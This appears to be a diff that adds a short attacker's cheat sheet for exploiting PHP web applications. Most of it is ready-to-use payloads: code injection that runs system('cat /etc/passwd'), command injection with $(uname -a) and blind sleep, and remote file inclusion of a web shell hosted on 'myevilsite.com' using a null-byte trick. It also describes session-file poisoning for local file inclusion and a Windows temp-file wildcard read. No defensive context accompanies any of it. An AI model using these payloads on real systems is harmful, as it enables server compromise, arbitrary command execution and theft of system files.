@@ -1,0 +1,42 @@
+PHPinfo()
+	if phpinfo() works try this in it's place:
+	system('cat%20/etc/passwd')
+		system() allows execution of commands on older version of PHP
+
+	http://www.site.com?user=jimmy'.phpinfo().'
+	http://www.site.com?user=jimmy'.system('cat%20/etc/passwd').'
+
+	http://www.site.com?user=jimmy$(uname -a)
+		if blind use sleep:
+
+	http://www.site.com?user=jimmy$(sleep 20)
+
+	http://victimsite.copm/?page=http://myevilsite.com/test_include_system.txt%00&c=uname
+		contents of test_include_system.txt file:
+			<?php 
+  			   system($_GET['c']);
+			?>
+		note the GET 'c' directive. is defined in the URL and executes whatever command is listed
+		also note the %00 which drops the file extenstion. The original parameter was:
+			page=intro
+				the application adds the .php to it. %00 drops the .php 
+
+
+
+PHP session file:
+	/var/lib/php5/sess_[session ID/cookie]
+	
+	login to php page with: ted<?php phpinfo(); ?>
+	if username stays populated with the above login you know it is stored
+	now goto:
+		http://site.com/blog.php?page=/var/lib/php5/sess_[session ID]
+	phpinfo page should be displayed
+
+
+PHP on Windows:
+	< translates to *
+	All files uploaded in php are temp stored in C:\windows\temp\php??.tmp
+	so you can do this:
+		fileview.php?loc=C:\Windows\Temp\php<.tmp
+			shows files uploaded in php
+
